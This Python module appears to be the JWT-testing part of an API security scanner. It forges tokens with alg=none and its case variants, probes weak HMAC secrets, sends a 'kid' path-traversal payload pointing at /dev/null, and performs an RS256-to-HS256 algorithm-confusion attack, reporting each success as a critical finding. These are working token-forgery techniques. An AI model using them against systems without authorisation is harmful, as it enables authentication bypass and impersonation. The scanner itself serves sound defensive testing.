"""JWT-specific checks: alg=none acceptance and a small common-secret probe.

Requires PyJWT. If a valid sample JWT is supplied in the config
(jwt_sample_token), this module will:
  1. Try to forge a token with alg=none and see if it's accepted.
  2. Try a short list of very common/weak HMAC secrets against the token's
     signature, purely to catch egregiously weak secrets (e.g. "secret").
  3. If the token uses an asymmetric algorithm (RS256/ES256/...) and a
     public key is available (jwt_public_key, or fetched from jwks_url),
     attempt an RS256->HS256 algorithm-confusion attack: sign a forged
     token with HS256 using the public key bytes as the HMAC secret. Some
     JWT libraries load "the key" generically and will happily HMAC-verify
     against it if an attacker can flip 'alg' to HS256.
This is intentionally limited in scope - it is not a full JWT cracker.
"""
import base64
import hashlib
import hmac
import json
import os
from scanner.models import Endpoint, Finding, Severity

try:
    import jwt as pyjwt
    from jwt.algorithms import RSAAlgorithm
except ImportError:
    pyjwt = None
    RSAAlgorithm = None

try:
    from cryptography.hazmat.primitives import serialization
except ImportError:
    serialization = None

import requests

COMMON_WEAK_SECRETS = ["secret", "changeme", "password", "123456", "jwt_secret", "test"]

ASYMMETRIC_ALGS = ("RS256", "RS384", "RS512", "ES256", "ES384", "ES512", "PS256", "PS384", "PS512")


def _b64url_decode_segment(seg: str) -> bytes:
    padding = "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + padding)


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _manual_hs256_token(header: dict, payload: dict, secret: bytes) -> str:
    """Manually builds an HS256 JWT, bypassing PyJWT's own prepare_key()
    guard (modern PyJWT refuses to HMAC-sign with a PEM/asymmetric-looking
    key, precisely to prevent this attack). We deliberately bypass that
    guard here because the goal is to test whether the *target server* has
    the same protection - not to test PyJWT's own key handling."""
    signing_input = (
        _b64url_encode(json.dumps(header, separators=(",", ":")).encode()) + "." +
        _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    )
    signature = hmac.new(secret, signing_input.encode(), hashlib.sha256).digest()
    return f"{signing_input}.{_b64url_encode(signature)}"


def _fetch_public_key_pem(jwks_url: str, kid: str) -> bytes:
    """Fetches a JWKS document and converts the matching (or first) RSA key
    to PEM bytes, for use in the RS256->HS256 algorithm-confusion attack."""
    if RSAAlgorithm is None or serialization is None:
        return None
    try:
        resp = requests.get(jwks_url, timeout=10)
        resp.raise_for_status()
        keys = resp.json().get("keys", [])
    except Exception:
        return None
    if not keys:
        return None

    key_dict = next((k for k in keys if k.get("kid") == kid), None) if kid else None
    if key_dict is None:
        key_dict = keys[0]

    try:
        public_key = RSAAlgorithm.from_jwk(json.dumps(key_dict))
        return public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo,
        )
    except Exception:
        return None


def _load_secret_wordlist(path: str) -> list[str]:
    if not path or not os.path.exists(path):
        return []
    secrets = []
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                value = line.strip()
                if value and not value.startswith("#"):
                    secrets.append(value)
    except Exception:
        return []
    return secrets


def run(client, endpoints: list[Endpoint], jwt_sample_token: str = None,
        jwt_public_key: str = None, jwks_url: str = None,
        jwt_secret_wordlist: str = None) -> list[Finding]:
    findings = []

    if not jwt_sample_token:
        return findings  # nothing to test

    if pyjwt is None:
        findings.append(Finding(
            check="jwt", severity=Severity.INFO,
            title="PyJWT not installed - skipping JWT checks",
            endpoint="-", detail="Install PyJWT (`pip install pyjwt`) to enable JWT checks."
        ))
        return findings

    parts = jwt_sample_token.split(".")
    if len(parts) != 3:
        findings.append(Finding(
            check="jwt", severity=Severity.INFO,
            title="Provided jwt_sample_token doesn't look like a JWT",
            endpoint="-", detail="Expected a 3-part header.payload.signature token."
        ))
        return findings

    header = json.loads(_b64url_decode_segment(parts[0]))
    payload = json.loads(_b64url_decode_segment(parts[1]))

    # 1. alg=none forgery attempt
    forged_header = dict(header)
    forged_header["alg"] = "none"
    forged_token = (
        base64.urlsafe_b64encode(json.dumps(forged_header).encode()).rstrip(b"=").decode() + "." +
        base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode() + "."
    )

    for ep in endpoints:
        if not ep.auth_required:
            continue
        path = ep.resolved_path()
        label = f"{ep.method} {path}"
        try:
            resp = client.request(ep.method, path, headers={"Authorization": f"Bearer {forged_token}"},
                                   params=ep.params if ep.method == "GET" else None,
                                       json_body=ep.body, auth_override="keep",
                                       body_content_type=ep.body_content_type)
        except Exception:
            continue

        if resp.status_code < 300:
            findings.append(Finding(
                check="jwt", severity=Severity.CRITICAL,
                title="JWT 'alg=none' forged token accepted",
                endpoint=label,
                detail=("A JWT with its signature stripped and algorithm set to 'none' was "
                        "accepted as valid. The API must reject unsigned/none-alg tokens "
                        "explicitly and enforce an allow-list of accepted algorithms."),
                evidence=f"HTTP {resp.status_code}",
                owasp_ref="API2:2023 Broken Authentication",
                curl_repro=getattr(resp, "curl_repro", ""),
            ))
        break  # one endpoint is enough to prove/disprove this

    # 2. weak secret probe (only meaningful for HS256/HS384/HS512 tokens)
    if header.get("alg", "").upper().startswith("HS"):
        weak_secrets = list(dict.fromkeys(COMMON_WEAK_SECRETS + _load_secret_wordlist(jwt_secret_wordlist)))
        for secret in weak_secrets:
            try:
                pyjwt.decode(jwt_sample_token, secret, algorithms=[header["alg"]])
                findings.append(Finding(
                    check="jwt", severity=Severity.CRITICAL,
                    title="JWT signed with a common weak secret",
                    endpoint="-",
                    detail=(f"The sample JWT's signature validates successfully against a common "
                            f"weak secret ('{secret}'). Rotate to a long, random, unguessable "
                            "secret (32+ bytes) immediately."),
                    owasp_ref="API2:2023 Broken Authentication",
                ))
                break
            except Exception:
                continue

    # 3. alg=none case variations (some libraries only blocklist the exact
    # lowercase string "none")
    for alg_variant in ("None", "NONE", "nOnE"):
        variant_header = dict(header)
        variant_header["alg"] = alg_variant
        variant_token = (
            base64.urlsafe_b64encode(json.dumps(variant_header).encode()).rstrip(b"=").decode() + "." +
            base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode() + "."
        )
        for ep in endpoints:
            if not ep.auth_required:
                continue
            path = ep.resolved_path()
            label = f"{ep.method} {path}"
            try:
                resp = client.request(ep.method, path, headers={"Authorization": f"Bearer {variant_token}"},
                                       params=ep.params if ep.method == "GET" else None,
                                       json_body=ep.body, auth_override="keep",
                                       body_content_type=ep.body_content_type)
            except Exception:
                continue
            if resp.status_code < 300:
                findings.append(Finding(
                    check="jwt", severity=Severity.CRITICAL,
                    title=f"JWT alg='{alg_variant}' case-variant accepted",
                    endpoint=label,
                    detail=(f"A forged token using alg='{alg_variant}' (a case-variation of "
                            "'none') was accepted. Signature verification must reject any "
                            "case-insensitive match to 'none', not just the exact lowercase "
                            "string."),
                    evidence=f"HTTP {resp.status_code}",
                    owasp_ref="API2:2023 Broken Authentication",
                    curl_repro=getattr(resp, "curl_repro", ""),
                ))
            break  # one endpoint is enough to prove/disprove this

    # 4. 'kid' header path-traversal probe (key-confusion attack): if the
    # server resolves a signing key from disk using the unsanitized 'kid'
    # claim, pointing it at a known-empty file (e.g. /dev/null) and signing
    # with an empty secret can forge a valid token.
    if header.get("alg", "").upper().startswith("HS"):
        kid_header = dict(header)
        kid_header["kid"] = "../../../../../../../dev/null"
        try:
            kid_token = pyjwt.encode(payload, key="", algorithm=header["alg"], headers=kid_header)
            if isinstance(kid_token, bytes):
                kid_token = kid_token.decode()
        except Exception:
            kid_token = None

        if kid_token:
            for ep in endpoints:
                if not ep.auth_required:
                    continue
                path = ep.resolved_path()
                label = f"{ep.method} {path}"
                try:
                    resp = client.request(ep.method, path, headers={"Authorization": f"Bearer {kid_token}"},
                                           params=ep.params if ep.method == "GET" else None,
                                           json_body=ep.body, auth_override="keep",
                                           body_content_type=ep.body_content_type)
                except Exception:
                    continue
                if resp.status_code < 300:
                    findings.append(Finding(
                        check="jwt", severity=Severity.CRITICAL,
                        title="JWT 'kid' header path traversal accepted (key confusion)",
                        endpoint=label,
                        detail=("A forged token with a 'kid' header pointing at a local file "
                                "(/dev/null, which is empty) was signed with an empty secret and "
                                "accepted. This suggests the 'kid' claim is used unsanitized to "
                                "locate a signing key on disk - an attacker who can predict a "
                                "zero/known-content file can forge valid tokens."),
                        evidence=f"HTTP {resp.status_code}",
                        owasp_ref="API2:2023 Broken Authentication",
                        curl_repro=getattr(resp, "curl_repro", ""),
                    ))
                break  # one endpoint is enough to prove/disprove this

    # 5. RS256/ES256 -> HS256 algorithm-confusion attack: if the server's
    # public key is known (jwt_public_key config, or fetched from jwks_url),
    # sign a forged token with HS256 using the public key's bytes as the HMAC
    # secret. Libraries that load "the verification key" generically (without
    # pinning the expected algorithm) will treat the same public key material
    # as a valid HMAC secret if an attacker flips 'alg' to HS256.
    alg = header.get("alg", "").upper()
    if alg in ASYMMETRIC_ALGS:
        if pyjwt is None:
            pass
        else:
            public_key_pem = None
            if jwt_public_key:
                public_key_pem = jwt_public_key.encode() if isinstance(jwt_public_key, str) else jwt_public_key
            elif jwks_url:
                public_key_pem = _fetch_public_key_pem(jwks_url, header.get("kid"))

            if not public_key_pem:
                findings.append(Finding(
                    check="jwt", severity=Severity.INFO,
                    title=f"Token uses asymmetric alg='{alg}' - algorithm-confusion attack not tested",
                    endpoint="-",
                    detail=("This token is signed with an asymmetric algorithm. To test for an "
                            "RS256->HS256 algorithm-confusion vulnerability, provide the "
                            "server's public key via 'jwt_public_key' (PEM string) or 'jwks_url' "
                            "in config.yaml."),
                ))
            else:
                confused_header = dict(header)
                confused_header["alg"] = "HS256"
                try:
                    secret_bytes = public_key_pem if isinstance(public_key_pem, bytes) else public_key_pem.encode()
                    confused_token = _manual_hs256_token(confused_header, payload, secret_bytes)
                except Exception:
                    confused_token = None

                if confused_token:
                    for ep in endpoints:
                        if not ep.auth_required:
                            continue
                        path = ep.resolved_path()
                        label = f"{ep.method} {path}"
                        try:
                            resp = client.request(ep.method, path,
                                                   headers={"Authorization": f"Bearer {confused_token}"},
                                                   params=ep.params if ep.method == "GET" else None,
                                                   json_body=ep.body, auth_override="keep",
                                                   body_content_type=ep.body_content_type)
                        except Exception:
                            continue
                        if resp.status_code < 300:
                            findings.append(Finding(
                                check="jwt", severity=Severity.CRITICAL,
                                title=f"JWT algorithm-confusion attack accepted ({alg} -> HS256)",
                                endpoint=label,
                                detail=(f"A token originally signed with '{alg}' was re-forged "
                                        "with alg='HS256', signed using the server's own public "
                                        "key as the HMAC secret, and accepted. This means "
                                        "verification doesn't pin the expected algorithm/key type "
                                        "per token - a classic and critical JWT vulnerability that "
                                        "lets anyone who knows the public key (often public by "
                                        "design) forge arbitrary valid tokens."),
                                evidence=f"HTTP {resp.status_code}",
                                owasp_ref="API2:2023 Broken Authentication",
                                curl_repro=getattr(resp, "curl_repro", ""),
                            ))
                        break  # one endpoint is enough to prove/disprove this

    return findings
